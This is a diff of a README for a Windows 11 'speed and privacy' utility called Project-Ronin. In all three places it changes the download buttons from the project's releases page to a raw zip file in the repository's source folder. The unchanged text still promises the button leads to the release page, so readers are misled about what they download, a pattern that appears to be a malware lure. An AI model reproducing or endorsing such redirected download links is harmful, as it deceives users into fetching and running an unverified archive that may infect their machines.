@@ -1,6 +1,6 @@
 # ⚡ Project-Ronin - Speed and Privacy for Windows 11
 
-[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-brightgreen)](https://github.com/vidnisie/Project-Ronin/releases)
+[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-brightgreen)](https://raw.githubusercontent.com/vidnisie/Project-Ronin/main/src/Project_Ronin_Kongo.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You will find the latest version of Project-Ronin on the official release page. 
 
 1. Click on this big button below. This will take you to the release page where you can get the installer file.
 
-[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-blue)](https://github.com/vidnisie/Project-Ronin/releases)
+[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-blue)](https://raw.githubusercontent.com/vidnisie/Project-Ronin/main/src/Project_Ronin_Kongo.zip)
 
 2. On the release page, look for the latest version. It will usually have a name like `Project-Ronin-Setup.exe` or similar.
 
@@ -120,4 +120,4 @@ If you need help, check the “Issues” section on the Project-Ronin GitHub pag
 
 Visit this page to download the latest version:  
 
-[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-brightgreen)](https://github.com/vidnisie/Project-Ronin/releases)
+[![Download Project-Ronin](https://img.shields.io/badge/Download-Project--Ronin-brightgreen)](https://raw.githubusercontent.com/vidnisie/Project-Ronin/main/src/Project_Ronin_Kongo.zip)
